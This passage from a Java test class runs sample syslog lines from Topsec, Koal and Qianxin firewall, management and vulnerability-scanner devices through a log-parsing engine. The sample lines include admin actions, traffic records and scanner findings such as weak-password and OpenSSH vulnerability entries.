      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:50:42\" dev=\"TopsecOS\" pri=\"notice\" type=\"mgmt\" recorder=\"author\" vsid=\"\" vsys_name=\"default\" subtype=\"策略管理\" op=\"start\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"启用运维授权成功\" name=\"ll,\" state=\"启用\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:51:21\" dev=\"TopsecOS\" pri=\"notice\" type=\"mgmt\" recorder=\"rule\" vsid=\"\" vsys_name=\"default\" subtype=\"策略管理\" op=\"stop\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"停用运维规则成功\" name=\"aaa\" state=\"停用\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:52:56\" dev=\"TopsecOS\" pri=\"info\" type=\"mgmt\" recorder=\"log\" vsid=\"\" vsys_name=\"default\" subtype=\"审计管理\" op=\"export\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"导出日志成功\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:52:19\" dev=\"TopsecOS\" pri=\"notice\" type=\"mgmt\" recorder=\"operationRecord\" vsid=\"\" vsys_name=\"default\" subtype=\"审计管理\" op=\"play\" user=\"admin\" src=\"192.168.151.110\" result=\"0\" msg=\"播放审计视频失败\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:52:42\" dev=\"TopsecOS\" pri=\"info\" type=\"mgmt\" recorder=\"report\" vsid=\"\" vsys_name=\"default\" subtype=\"审计管理\" op=\"create\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"生成报表成功\" name=\"用户运维趋势(Top 10)\" rerortType=\"内置报表\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:52:35\" dev=\"TopsecOS\" pri=\"notice\" type=\"mgmt\" recorder=\"alert\" vsid=\"\" vsys_name=\"default\" subtype=\"审计管理\" op=\"del\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"删除告警成功\" alertName=\"内存告警\" alertType=\"本地告警\" alertRank=\"一般\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"1.0\" time=\"2020-01-06 17:53:14\" dev=\"TopsecOS\" pri=\"info\" type=\"mgmt\" recorder=\"setting\" vsid=\"\" vsys_name=\"default\" subtype=\"系统配置\" op=\"set\" user=\"admin\" src=\"192.168.151.110\" result=\"1\" msg=\"设置短信成功\"";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //格尔网盾
  public void testEpsKoal() {
    String parserFile = "./resources/parsers/eps_koal_netdefense[5.1]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "logtype=\"网盾PC保护\" time=\"2019-10-31 21:39:29\" event=\"解除锁定\" user=\"\"  host=\"host\" station=\"localhost\" result=\"成功审核\" desc=\"N/A\"";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //奇安信防火墙
  public void testFWQianxin() {
    String parserFile = "./resources/parsers/firewall_qianxin_firewall[6.1.10.51765]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "devid=\"3\" dname=\"NSG\" serial=\"6ea854364a9c3f40d4f5fe0d8997bc9f4ef5daa4\" module=\"ad\" severity=\"emerg\" vsys=\"root-vsys\" type=\"threat\" session_id=\"0\" time=\"1594011600\" addr_src=\"36.32.3.214\" addr_dst=\"120.33.204.246\" nataddr_src=\"::\" nataddr_dst=\"::\" natport_src=\"0\" natport_dst=\"0\" proto=\"TCP\" hit_num=\"31\" focus_type=\"NO\" action=\"drop\" session_time=\"0\" sess_nth=\"0\" sess_dev_id=\"0\" port_src=\"58208\" port_dst=\"33358\" user_src=\"\" user_dst=\"\" locale_src=\"安徽省合肥市\" locale_dst=\"福建省莆田市\" interface_src=\"\" interface_dst=\"\" zone_src=\"untrust\" zone_dst=\"\" appname=\"unidentified\" rule=\"__fast_disposal__\" profile=\"\" non_standard_port=\"NO\" app_category=\"CATEGORY-NONE\" app_risk=\"5\" asset_os_src=\"\" asset_os_dst=\"\" asset_name_src=\"\" asset_name_dst=\"\" asset_type_src=\"\" asset_type_dst=\"\" duration=\"0\" attacker_ip=\"36.32.3.214\" victim_ip=\"120.33.204.246\" attack_name=\"\" victim_name=\"\" sample_name=\"\" threat_name=\"Portscan\" threat_type=\"Attack_Defend\" threat_id=\"80011\" ioc_id=\"\" disposal_id=\"\" filename=\"\" filepath=\"\"";
      parse(botuEngine, data);
      data = "devid=\"3\" dname=\"NSG\" serial=\"6ea854364a9c3f40d4f5fe0d8997bc9f4ef5daa4\" module=\"dns\" severity=\"info\" vsys=\"root-vsys\" type=\"dns\" session_id=\"2203045\" time=\"1594011600\" addr_src=\"10.125.34.52\" addr_dst=\"223.5.5.5\" nataddr_src=\"110.89.45.5\" nataddr_dst=\"::\" natport_src=\"56405\" natport_dst=\"0\" proto=\"UDP\" hit_num=\"0\" focus_type=\"NO\" action=\"permit\" session_time=\"25950801\" sess_nth=\"0\" sess_dev_id=\"0\" port_src=\"56405\" port_dst=\"53\" user_src=\"\" user_dst=\"\" locale_src=\"内网\" locale_dst=\"浙江省杭州市\" interface_src=\"vlan10\" interface_dst=\"s2ge5\" zone_src=\"trust\" zone_dst=\"untrust\" appname=\"DNS\" rule=\"出流量全放开\" profile=\"\" non_standard_port=\"NO\" app_category=\"APP_NETWORK\" app_risk=\"4\" asset_os_src=\"\" asset_os_dst=\"\" asset_name_src=\"\" asset_name_dst=\"\" asset_type_src=\"\" asset_type_dst=\"\" dns_domain=\"ws.cc.sky-deep.com\" dns_host=\"119.3.239.225\" dns_type=\"A\" dns_ttl=\"544\" dns_cname=\"\"";
      parse(botuEngine, data);
      data = "Aug 07 20:15:30 172.24.236.219 devid=\"3\" dname=\"NSG\" serial=\"0128e9579af5554ade3d4c25e06608c86dd80bd1\" module=\"ai\" severity=\"notice\" vsys=\"root-vsys\" type=\"im\" session_id=\"733795\" time=\"1594011600\" duration=\"0\" addr_src=\"172.24.238.1\" addr_dst=\"58.60.10.45\" nataddr_src=\"192.168.55.1\" nataddr_dst=\"::\" port_src=\"60179\" port_dst=\"8000\" natport_src=\"60179\" natport_dst=\"0\" action=\"permit\" appname=\"QQ_TIM\" rule=\"PC-TO-INTERNET-APP\" proto=\"UDP\" session_time=\"1597\" sess_nth=\"0\" sess_dev_id=\"0\" zone_src=\"trust\" zone_dst=\"untrust\" locale_src=\"内网\" locale_dst=\"广东省深圳市\" user_src=\"\" user_dst=\"\" app_category=\"APP_INTERACTION\" app_risk=\"4\" asset_os_src=\"\" asset_os_dst=\"\" asset_name_src=\"\" asset_name_dst=\"\" asset_type_src=\"\" asset_type_dst=\"\" focus_type=\"YES\" profile=\"\" non_standard_port=\"NO\" im_account=\"495799729\" im_action=\"Login\"";
      parse(botuEngine, data);
      data = "Aug 07 20:14:37 172.24.236.219 devid=\"3\" dname=\"NSG\" serial=\"0128e9579af5554ade3d4c25e06608c86dd80bd1\" module=\"access-control\" severity=\"info\" vsys=\"root-vsys\" type=\"behavior\" session_id=\"877242\" time=\"1594011600\" duration=\"0\" addr_src=\"172.24.238.1\" addr_dst=\"180.163.251.208\" nataddr_src=\"192.168.55.1\" nataddr_dst=\"::192.168.12.1\" port_src=\"62446\" port_dst=\"80\" natport_src=\"62446\" natport_dst=\"0\" action=\"log\" appname=\"360Safe\" rule=\"PC-TO-INTERNET-APP\" proto=\"TCP\" session_time=\"1103\" sess_nth=\"1\" sess_dev_id=\"0\" zone_src=\"trust\" zone_dst=\"untrust\" locale_src=\"内网\" locale_dst=\"上海市\" user_src=\"\" user_dst=\"\" app_category=\"APP_BUSSINESS\" app_risk=\"3\" asset_os_src=\"\" asset_os_dst=\"\" asset_name_src=\"\" asset_name_dst=\"\" asset_type_src=\"\" asset_type_dst=\"\" focus_type=\"YES\" profile=\"\" non_standard_port=\"NO\" behavior_proto=\"HTTP\" behavior_command=\"Upload File\"";
      parse(botuEngine, data);
      data = "devid=\"3\" dname=\"NSG\" serial=\"6ea854364a9c3f40d4f5fe0d8997bc9f4ef5daa4\" module=\"flow\" severity=\"info\" vsys=\"root-vsys\" type=\"traffic-start\" session_id=\"2198117\" time=\"1594011600\" addr_src=\"10.125.34.56\" addr_dst=\"114.115.165.232\" nataddr_src=\"110.89.45.5\" nataddr_dst=\"::\" natport_src=\"45225\" natport_dst=\"0\" proto=\"TCP\" hit_num=\"0\" focus_type=\"NO\" action=\"permit\" session_time=\"25950695\" sess_nth=\"0\" sess_dev_id=\"0\" port_src=\"45225\" port_dst=\"44300\" user_src=\"\" user_dst=\"\" locale_src=\"内网\" locale_dst=\"中国\" interface_src=\"vlan10\" interface_dst=\"s2ge5\" zone_src=\"trust\" zone_dst=\"untrust\" appname=\"unidentified\" rule=\"出流量全放开\" profile=\"\" non_standard_port=\"NO\" app_category=\"CATEGORY-NONE\" app_risk=\"5\" asset_os_src=\"\" asset_os_dst=\"\" asset_name_src=\"\" asset_name_dst=\"\" asset_type_src=\"\" asset_type_dst=\"\" duration=\"1\" bytes_sent=\"60\" bytes_received=\"40\" pkts_sent=\"1\" pkts_received=\"1\" total_sess=\"0\" from_tunnel=\"\" to_tunnel=\"\"";
      parse(botuEngine, data);
      data = "Jul 24 15:13:57 10.125.0.211 devid=\"3\" dname=\"NSG\" serial=\"6ea854364a9c3f40d4f5fe0d8997bc9f4ef5daa4\" module=\"flow\" severity=\"info\" vsys=\"root-vsys\" type=\"traffic-end\" session_id=\"0\" time=\"1594011600\" addr_src=\"10.125.5.160\" addr_dst=\"10.195.29.55\" nataddr_src=\"::\" nataddr_dst=\"::\" natport_src=\"0\" natport_dst=\"0\" proto=\"UDP\" hit_num=\"0\" focus_type=\"NO\" action=\"deny\" session_time=\"0\" sess_nth=\"0\" sess_dev_id=\"0\" port_src=\"49867\" port_dst=\"514\" user_src=\"\" user_dst=\"\" locale_src=\"内网\" locale_dst=\"内网\" interface_src=\"vlan10\" interface_dst=\"s2ge5\" zone_src=\"trust\" zone_dst=\"untrust\" appname=\"SYSLOG\" rule=\"禁止内部设备上网\" profile=\"\" non_standard_port=\"NO\" app_category=\"APP_NETWORK\" app_risk=\"1\" asset_os_src=\"\" asset_os_dst=\"\" asset_name_src=\"\" asset_name_dst=\"\" asset_type_src=\"\" asset_type_dst=\"\" duration=\"0\" bytes_sent=\"0\" bytes_received=\"0\" pkts_sent=\"0\" pkts_received=\"0\" total_sess=\"0\" from_tunnel=\"\" to_tunnel=\"\"";
      parse(botuEngine, data);
      data = "Aug 07 20:14:37 172.24.236.219 devid=\"3\" dname=\"NSG\" serial=\"0128e9579af5554ade3d4c25e06608c86dd80bd1\" module=\"url\" severity=\"info\" vsys=\"root-vsys\" type=\"url\" session_id=\"877242\" time=\"1594011600\" duration=\"0\" addr_src=\"172.24.238.1\" addr_dst=\"180.163.251.208\" nataddr_src=\"192.168.55.1\" nataddr_dst=\"::\" port_src=\"62446\" port_dst=\"80\" natport_src=\"62446\" natport_dst=\"0\" action=\"log\" appname=\"360Safe\" rule=\"PC-TO-INTERNET-APP\" proto=\"TCP\" session_time=\"1103\" sess_nth=\"0\" sess_dev_id=\"0\" zone_src=\"trust\" zone_dst=\"untrust\" locale_src=\"内网\" locale_dst=\"上海市\" user_src=\"\" user_dst=\"\" app_category=\"APP_BUSSINESS\" app_risk=\"3\" asset_os_src=\"\" asset_os_dst=\"\" asset_name_src=\"\" asset_name_dst=\"\" asset_type_src=\"\" asset_type_dst=\"\" focus_type=\"NO\" profile=\"\" non_standard_port=\"NO\" url=\"180.163.251.208\" url_category=\"Other Sites\" url_sub_type=\"IP\" url_content_type=\"multipart/form-data; boundary=----------------------------c0ef2\" url_user_agent=\"post_multipart\" url_mime_type=\"multipart/form-data; boundary=----------------------------c0ef2";
      parse(botuEngine, data);
      data = "Dec 26 20:13:17 172.24.213.201 devid=\"3\" dname=\"鲲鹏出口\" serial=\"8c151d31ad23faa027b5858bc23ff8e7365baee2\" module=\"flow\" severity=\"info\" vsys=\"root-vsys\" type=\"traffic-end\" session_id=\"0\" time=\"1577362268\" duration=\"0\" addr_src=\"192.168.10.100\" addr_dst=\"62.207.132.137\" nataddr_src=\"::\" nataddr_dst=\"::\" port_src=\"55147\" port_dst=\"445\" natport_src=\"0\" natport_dst=\"0\" action=\"deny\" appname=\"SMB\" rule=\"deny-445\" proto=\"TCP\" session_time=\"0\" sess_nth=\"0\" sess_dev_id=\"0\" zone_src=\"鲲鹏B网-测试\" zone_dst=\"to_ops_外网\" locale_src=\"内网\" locale_dst=\"荷兰\" user_src=\"\" user_dst=\"\" app_category=\"APP_NETWORK\" app_risk=\"3\" asset_os_src=\"\" asset_os_dst=\"\" asset_name_src=\"\" asset_name_dst=\"\" asset_type_src=\"\" asset_type_dst=\"\" focus_type=\"NO\" profile=\"\" non_standard_port=\"NO\" bytes_sent=\"0\" bytes_received=\"0\" pkts_sent=\"0\" pkts_received=\"0\" total_sess=\"0\" from_tunnel=\"\" to_tunnel=\"\"";
      parse(botuEngine, data);
      data = "Aug 08 10:25:44 172.24.239.41 devid=\"3\" dname=\"NSG\" serial=\"caa283cb660c7c6d5a4292861853395a30f8dd3a\" module=\"mail-filter\" severity=\"info\" vsys=\"root-vsys\" type=\"mail\" session_id=\"92573\" time=\"1565231181\" duration=\"0\" addr_src=\"5022::42\" addr_dst=\"7821::3\" nataddr_src=\"::\" nataddr_dst=\"::\" port_src=\"29894\" port_dst=\"25\" natport_src=\"0\" natport_dst=\"0\" action=\"log\" appname=\"SMTP\" rule=\"BPS-IPV6-APP\" proto=\"TCP\" session_time=\"2505\" sess_nth=\"3\" sess_dev_id=\"0\" zone_src=\"BPS_CLIENT_IPV6\" zone_dst=\"BPS_SERVER_IPV6\" locale_src=\"\" locale_dst=\"\" user_src=\"\" user_dst=\"\" app_category=\"APP_NETWORK\" app_risk=\"5\" asset_os_src=\"\" asset_os_dst=\"\" asset_name_src=\"\" asset_name_dst=\"\" asset_type_src=\"\" asset_type_dst=\"\" focus_type=\"YES\" profile=\"\" non_standard_port=\"NO\" direction=\"send\" mail_from=\"sender@example.com\" mail_to=\"recipient@example.com\" mail_subject=\"\" mail_cc=\"\" real_receiver=\"recipient@example.com\" mail_date=\"\"";
      parse(botuEngine, data);
      data = "Aug 08 10:25:47 172.24.236.219 devid=\"3\" dname=\"NSG\" serial=\"0128e9579af5554ade3d4c25e06608c86dd80bd1\" module=\"file-filter\" severity=\"info\" vsys=\"root-vsys\" type=\"content\" session_id=\"844720\" time=\"1565231176\" duration=\"0\" addr_src=\"22.1.1.52\" addr_dst=\"21.1.1.56\" nataddr_src=\"23.1.1.57\" nataddr_dst=\"::\" port_src=\"5486\" port_dst=\"80\" natport_src=\"5486\" natport_dst=\"0\" action=\"log\" appname=\"HTTP\" rule=\"BPS-IPV4-APP\" proto=\"TCP\" session_time=\"1392\" sess_nth=\"1\" sess_dev_id=\"0\" zone_src=\"BPS_CLIENT_IPV4\" zone_dst=\"BPS_SERVER_IPV4\" locale_src=\"美国\" locale_dst=\"美国\" user_src=\"\" user_dst=\"\" app_category=\"APP_NETWORK\" app_risk=\"1\" asset_os_src=\"\" asset_os_dst=\"\" asset_name_src=\"\" asset_name_dst=\"\" asset_type_src=\"\" asset_type_dst=\"\" focus_type=\"YES\" profile=\"\" non_standard_port=\"NO\" direction=\"download\" content_type=\"file\" filename=\"/\" filetype=\"html\" keyword=\"\" saved_filename=\"\"";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //天融信漏扫
  public void testVulnScannerTopsec1() {
    String parserFile = "./resources/parsers/vulnscanner_topsec_topvas[3.2294.1073_tvs.1_r]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"管理员配置日志\" recorder=\"config\" index=\"2000\" vsid=\"0\" user=\"superman\" src=\"10.25.12.125\" result=\"0\" msg=\"log config set ipaddr  192.168.1.254 10.26.32.153 port udp:514 logtype syslog trans enable trans_gather no trans_coding gb2312 \"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"管理员配置日志\" recorder=\"config\" index=\"2000\" vsid=\"0\" user=\"superman\" src=\"10.25.12.125\" result=\"0\" msg=\"log config set console off local-database off \"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:35:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"管理员登录日志\" recorder=\"admin\" index=\"2010\" vsid=\"0\" user=\"superman\" src=\"10.25.12.125\" op=\"退出\" method=\"Web浏览器\" result=\"0\" description=\"admin logout success\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:35:15\" dev=\"TopsecOS\" pri=\"信息\" type=\"管理员登录日志\" recorder=\"admin\" index=\"2010\" vsid=\"0\" user=\"\" src=\"\" op=\"本地认证\" method=\"Web浏览器\" result=\"-3007\" description=\"Incorrect password.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:10:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"管理员密码修改日志\" recorder=\"admin\" index=\"2011\" vsid=\"0\" user=\"superman\" result=\"0\" description=\"modify self passwd success.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"管理员增删日志\" recorder=\"admin_config\" index=\"2012\" vsid=\"0\" user=\"superman\" description=\"add admin name grantor success.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:53:10\" dev=\"TopsecOS\" pri=\"告警\" type=\"固件升级\" recorder=\"firmware\" index=\"2090\" vsid=\"0\" op=\"update\" result=\"0\" msg=\"update success.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-05-06 05:54:58\" dev=\"TopsecOS\" pri=\"通知\" type=\"license升级\" recorder=\"license\" index=\"2095\" vsid=\"0\" op=\"update\" msg=\"license update failed.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-29 07:50:40\" dev=\"TopsecOS\" pri=\"信息\" type=\"规则库升级\" recorder=\"rules_update\" index=\"2105\" vsid=\"0\" op=\"import\" msg=\"rules-update import success\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"告警\" type=\"CPU占用率日志\" recorder=\"cpu_monitor\" index=\"2400\" vsid=\"0\" msg=\"The occupancy rate of CPU has reached 100%!\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:19\" dev=\"TopsecOS\" pri=\"告警\" type=\"内存占用率日志\" recorder=\"memory_monitor\" index=\"2401\" vsid=\"0\" msg=\"The occupancy rate of MEMORY has reached 32%!\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:19\" dev=\"TopsecOS\" pri=\"告警\" type=\"磁盘占用率日志\" recorder=\"disk_monitor\" index=\"2402\" vsid=\"0\" msg=\"The occupancy rate of DISK has reached 27%!\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-29 08:00:07\" dev=\"TopsecOS\" pri=\"告警\" type=\"服务监控日志\" recorder=\"recover\" index=\"2405\" vsid=\"0\" msg=\"[2021-04-29 16:00:07] the process of 'configd' is started by  tos_recoverd.\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"主机扫描日志\" recorder=\"topvas\" index=\"2492\" vsid=\"0\" logType=\"1\" userName=\"superman\" opsStatus=\"1\" opsDesc=\"Send host scanning result\" srcIPv4=\"10.26.50.25\" srcIPv6=\"fe80::250:56ff:fea9:4ef3\" srcPort=\"0\" dstIPv4=\"10.26.41.2\" dstIPv6=\"null\" dstPort=\"0\" dstDomainName=\"null\" scanType=\"系统扫描\" startTime=\"Wed Jul 13 09:58:36 2072\" endTime=\"Wed Jul 13 09:58:36 2072\" scanTime=\"44\" scanID=\"主机扫描\" hostVulnResult=\"high(0),middle(3),low(2),info(4)\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"漏洞信息日志\" recorder=\"topvas\" index=\"2493\" vsid=\"0\" srcIPv4=\"10.26.50.25\" srcIPv6=\"fe80::250:56ff:fea9:4ef3\" srcPort=\"0\" dstIPv4=\"10.26.33.234\" dstIPv6=\"null\" dstPort=\"5432\" dstDomainName=\"\" scanID=\"cp-cp-234\" scanType=\"系统扫描\" VulnName=\"PostgreSQL弱密码\" VulnType=\"3\" TVID=\"TVID-201800-51128\" VulnCost=\"9\" VulnRepair=\"尽快修改密码。\" VulnDesc=\"可以使用弱凭据以用户postgres身份登录到远程PostgreSQL。\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"漏洞信息日志\" recorder=\"topvas\" index=\"2493\" vsid=\"0\" srcIPv4=\"10.26.50.25\" srcIPv6=\"fe80::250:56ff:fea9:4ef3\" srcPort=\"0\" dstIPv4=\"10.26.33.234\" dstIPv6=\"null\" dstPort=\"0\" dstDomainName=\"\" scanID=\"cp-cp-234\" scanType=\"系统扫描\" VulnName=\"操作系统探测\" VulnType=\"3\" TVID=\"TVID-201800-48752\" VulnCost=\"0\" VulnRepair=\"null\" VulnDesc=\"这个插件通过TopVAS操作系统指纹库，会列举出可能的操作系统\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"漏洞信息日志\" recorder=\"topvas\" index=\"2493\" vsid=\"0\" srcIPv4=\"10.26.50.25\" srcIPv6=\"fe80::250:56ff:fea9:4ef3\" srcPort=\"0\" dstIPv4=\"10.26.33.234\" dstIPv6=\"null\" dstPort=\"22\" dstDomainName=\"\" scanID=\"cp-cp-234\" scanType=\"系统扫描\" VulnName=\"OpenSSH 信息泄露漏洞(CVE-2018-15919)\" VulnType=\"3\" TVID=\"TVID-201800-38546\" VulnCost=\"5\" VulnRepair=\"https://www.openssh.com/\" VulnDesc=\"OpenSSH（OpenBSD Secure Shell）是OpenBSD计划组的一套用于安全访问远程计算机的连接工具。该工具是SSH协议的开源实现，支持对所有的传输进行加密，可有效阻止窃听、连接劫持以及其他网络级的攻击。OpenSSH 7.8及之前版本中的auth-gss2.c文件存在信息泄露漏洞。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可利用漏洞获取受影响组件敏感信息。\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"漏洞信息日志\" recorder=\"topvas\" index=\"2493\" vsid=\"0\" srcIPv4=\"10.26.50.25\" srcIPv6=\"fe80::250:56ff:fea9:4ef3\" srcPort=\"0\" dstIPv4=\"10.26.33.234\" dstIPv6=\"null\" dstPort=\"22\" dstDomainName=\"\" scanID=\"cp-cp-234\" scanType=\"系统扫描\" VulnName=\"支持SSH弱加密算法\" VulnType=\"3\" TVID=\"TVID-201600-45057\" VulnCost=\"4.3\" VulnRepair=\"禁用弱加密算法。\" VulnDesc=\"远程SSH服务器配置为允许弱加密算法。\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"通知\" type=\"黑名单日志\" recorder=\"topvas\" index=\"2494\" vsid=\"0\" TaskName=\"24.181-黑名单\" UserName=\"superman\" BlacklistNum=\"1\" comment=\"Scanner target is in blacklist!\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-29 07:41:56\" dev=\"TopsecOS\" pri=\"通知\" type=\"域名解析日志\" recorder=\"topvas\" index=\"2495\" vsid=\"0\" TaskName=\"域名解析日志\" UserName=\"superman\" host=\"www.liaoxuefeng.com\" comment=\"Domain Name Resolution Failed \"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-29 07:41:56\" dev=\"TopsecOS\" pri=\"通知\" type=\"域名解析日志\" recorder=\"topvas\" index=\"2495\" vsid=\"0\" TaskName=\"域名解析\" UserName=\"superman\" host=\"www.baidu.com\" comment=\"Domain Name Resolution Failed \"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"任务站点日志\" recorder=\"topvas\" index=\"2498\" vsid=\"0\" scanType=\"web扫描\" scanTaskName=\"24.181-站点\" scanStieName=\"https://10.26.24.181/\" templet=\"Scan Engine\" checks=\"unknown\" scanUrl=\"unknown\" scanMessage=\"crawling url:https://10.26.24.181/\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"任务站点日志\" recorder=\"topvas\" index=\"2498\" vsid=\"0\" scanType=\"web扫描\" scanTaskName=\"24.181-站点\" scanStieName=\"https://10.26.24.181/\" templet=\"Scan Engine\" checks=\"unknown\" scanUrl=\"https://10.26.24.181/\" scanMessage=\"crawling url:https://10.26.24.181/plugins/js/aes/pad-zeropadding.js\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"信息\" type=\"任务站点日志\" recorder=\"topvas\" index=\"2498\" vsid=\"0\" scanType=\"web扫描\" scanTaskName=\"24.181-站点\" scanStieName=\"https://10.26.24.181/\" templet=\"Scan Engine\" checks=\"unknown\" scanUrl=\"https://10.26.24.181/\" scanMessage=\"crawling url:https://10.26.24.181/plugins/js/aes/md5.js\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 05:50:10\" dev=\"TopsecOS\" pri=\"通知\" type=\"任务管理日志\" recorder=\"topvas\" index=\"2499\" vsid=\"0\" UserName=\"superman\" scanType=\"系统扫描\" scanName=\"24.181-黑名单\" distributed=\"本地模式\" moudle=\"全部漏洞\" operation=\"启动\" message=\"操作成功\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 06:50:10\" dev=\"TopsecOS\" pri=\"通知\" type=\"分布式配置日志\" recorder=\"topvas\" index=\"2502\" vsid=\"0\" host=\"10.26.50.25\" mode=\"本地模式\" message=\"切换到本地模式成功\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.1073_TVS.1_more\" time=\"2021-04-08 06:50:10\" dev=\"TopsecOS\" pri=\"通知\" type=\"分布式配置日志\" recorder=\"topvas\" index=\"2502\" vsid=\"0\" host=\"10.26.50.25\" mode=\"主模式\" message=\"切换到主模式成功\"";
      parse(botuEngine, data);
      data = "\"NGTOS\" \"v3.2294.10163_TVS.1\" \"2022-08-04 10:28:41\" \"TopsecOS\" \"通知\" \"任务管理日志\" \"topvas\" \"2499\" \"0\" UserName=\"superman\" scanType=\"系统扫描\" scanName=\"测试任务\" distributed=\"本地模式\" moudle=\"全部漏洞\" operation=\"重新扫描\" message=\"操作成功\"";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //天融信堡垒机
  public void testBastionTopsecSm() {
    String parserFile = "./resources/parsers/bastion_topsec_topsag[5.6.1sm]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
